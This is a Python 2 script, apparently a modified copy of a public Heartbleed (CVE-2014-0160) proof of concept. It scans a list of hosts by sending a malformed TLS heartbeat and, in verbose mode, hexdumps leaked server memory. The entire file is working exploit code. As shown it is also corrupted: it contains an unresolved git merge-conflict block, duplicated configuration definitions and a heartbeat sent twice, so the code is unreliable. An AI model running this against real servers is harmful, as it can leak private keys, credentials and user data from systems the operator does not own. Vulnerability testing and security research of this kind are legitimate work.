#!/usr/bin/python

# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
# The author disclaims copyright to this source code.

# Modified by bjm to more generically check a line-separated target list

# Usage example: python ssltest.py targets.txt

import sys
import struct
import socket
import time
import select
import re
from optparse import OptionParser

options = OptionParser(usage='%prog [options] file', description='Test for SSL heartbleed vulnerability (CVE-2014-0160) on multiple hosts, takes a file as an argument')
options.add_option('-p', '--port', type='int', default=443, dest='port', help='TCP port to test (default: 443)')
options.add_option('-v', '--verbose', action="store_true", dest="verbose", help='Be verbose: hexdump server memory')

versions = (['TLS 1.2','03 03'],
            ['TLS 1.1','03 02'],
            ['TLS 1.0','03 01'],
            ['SSL 3.0','03 00'])

timeout = 2  # tcp connection timeout

buffy = 4096 # tcp recv buffer

versions = (['SSL 3.0','03 00'],
            ['TLS 1.0','03 01'],
            ['TLS 1.1','03 02'],
            ['TLS 1.2','03 03'])

timeout = 2  # tcp connection timeout

buffy = 4096 # tcp recv buffer

def h2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')

def get_hello(ver):
    hello = h2bin('16 '+ver+' 00 dc 01 00 00 d8 '+ver+'''
53 43 5b 90 9d 9b 72 0b  bc 0c bc 2b 92 a8 48 97
cf bd 39 04 cc 16 0a 85  03 90 9f 77 04 33 d4 de
00 00 66 c0 14 c0 0a c0  22 c0 21 00 39 00 38 00
88 00 87 c0 0f c0 05 00  35 00 84 c0 12 c0 08 c0
1c c0 1b 00 16 00 13 c0  0d c0 03 00 0a c0 13 c0
09 c0 1f c0 1e 00 33 00  32 00 9a 00 99 00 45 00
44 c0 0e c0 04 00 2f 00  96 00 41 c0 11 c0 07 c0
0c c0 02 00 05 00 04 00  15 00 12 00 09 00 14 00
11 00 08 00 06 00 03 00  ff 01 00 00 49 00 0b 00
04 03 00 01 02 00 0a 00  34 00 32 00 0e 00 0d 00
19 00 0b 00 0c 00 18 00  09 00 0a 00 16 00 17 00
08 00 06 00 07 00 14 00  15 00 04 00 05 00 12 00
13 00 01 00 02 00 03 00  0f 00 10 00 11 00 23 00
00 00 0f 00 01 01
''')
    return hello
 
def get_hb(ver):
    hb = h2bin('18 '+ver+' 00 03 01 40 00')
    return hb

def hexdump(s):
    print "Woot"
    for b in xrange(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
        print '  %04x: %-48s %s' % (b, hxdat, pdat)
    print

def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = ''
    remain = length
    while remain > 0:
        rtime = endtime - time.time() 
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            try:
                data = s.recv(remain)
            except Exception, e:
                return None
            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata
        

def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        return None, None, None

    return typ, ver, pay

def hit_hb(s,hb):
    s.send(hb)
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            return False

        if typ == 24:
            if verbose:
                hexdump(pay)
            if len(pay) > 3:
                return True
            else:
                return False

        if typ == 21:
            if verbose:
                hexdump(pay)
            return False

def is_vulnerable(target, port):
<<<<<<< HEAD

    for version in versions:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        print "[C:",
        sys.stdout.flush()

=======

    for version in versions:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        print "[C:",
        sys.stdout.flush()

>>>>>>> 83601eaa503af811041fe0c0d0df0dd8dc3f3de3
        try:
            s.connect((target, port))
            if port == 25: # smtp
                s.recv(buffy)
                s.send("EHLO openssl.client.net\n")
                s.recv(buffy)
                s.send("STARTTLS\n")
                s.recv(buffy)
                print "STARTTLS.",
            if port == 21: # ftp
                s.recv(buffy)
                s.send("AUTH TLS\n")
                s.recv(buffy)
                print "STARTTLS.",
        except socket.timeout, e:
            print "Timeout]",
            return None
        except socket.error, e:
            print e[1]+"]",
            return None
        except Exception, e:
            print "Exception]",
            return None

        print version[0]+"..",
        sys.stdout.flush()

        s.send(get_hello(version[1]))

        while True:
            typ, ver, pay = recvmsg(s)
            if typ == None:
                print "Srv closed conn.",
                break
            # Look for server hello done message.
            if typ == 22 and ord(pay[0]) == 0x0E:
                break

        s.send(get_hb(version[1]))
        vulnerable = hit_hb(s,get_hb(version[1]))
        s.close()
        if vulnerable:
            return vulnerable
        else:
           print "pass]",
    return False


def main():
    global verbose
    opts, args = options.parse_args()
    if len(args) < 1:
        options.print_help()
        return
    else:
        inputFile = args[0]

    verbose = opts.verbose
    counter_nossl = 0;
    counter_notvuln = 0;
    counter_vuln = 0;

    f = open(inputFile, 'r')
    for line in f:
        try:
            target,overrideport = line.split(':')
            overrideport = overrideport.strip()
        except ValueError:
            target = line.strip()
            overrideport = False

        if overrideport:
            port = int(overrideport)
        else:
            port = int(opts.port)

        print "%s:%s," % (target,port),
        sys.stdout.flush();
        result = is_vulnerable(target, port);
        if result is None:
            print "No OpenSSL."
            counter_nossl += 1;
        elif result:
            print "Vulnerable!]"
            counter_vuln += 1;
        else:
            print "Safe."
            counter_notvuln += 1;

    print
    print "No OpenSSL: " + str(counter_nossl)
    print "Vulnerable: " + str(counter_vuln)
    print "Safe: " + str(counter_notvuln)

if __name__ == '__main__':
    main()
